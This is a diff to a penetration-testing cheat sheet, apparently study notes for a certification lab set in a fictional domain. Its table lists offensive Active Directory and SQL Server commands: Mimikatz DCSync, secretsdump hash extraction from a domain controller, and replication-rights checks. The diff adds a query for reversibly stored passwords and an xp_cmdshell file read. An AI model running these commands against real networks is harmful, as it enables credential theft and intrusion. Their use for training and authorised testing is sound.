@@ -320,6 +320,7 @@ categories: CheatSheets/CPTS
 | `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host. |
 | `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to an file (inlanefreight_hashes). Performed from a Linux-based host. |
 | `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses Mimikatz to perform a dcsync attack from a Windows-based host. |
+| `Get-DomainUser -Properties samaccountname, useraccountcontrol \| Where-Object { ($_.useraccountcontrol -band 128) } \| Select-Object samaccountname, useraccountcontrol` | PowerView command used to find users with "Store password using reversible encryption" enabled by checking userAccountControl flags. Helpful for identifying weakly stored credentials. |
 
 ---
 
@@ -341,6 +342,7 @@ categories: CheatSheets/CPTS
 | `SQL> help` | Used to display mssqlclient.py options once connected to a MSSQL server. |
 | `SQL> enable_xp_cmdshell` | Used to enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host. |
 | `xp_cmdshell whoami /priv` | Used to enumerate rights on a system using xp_cmdshell. |
+| `EXEC xp_cmdshell 'type "C:\Users\damundsen\Desktop\flag.txt"'`; | Used to read the contents of a file (in this case, flag.txt) from the Windows file system via SQL Server. |
 
 ---
 
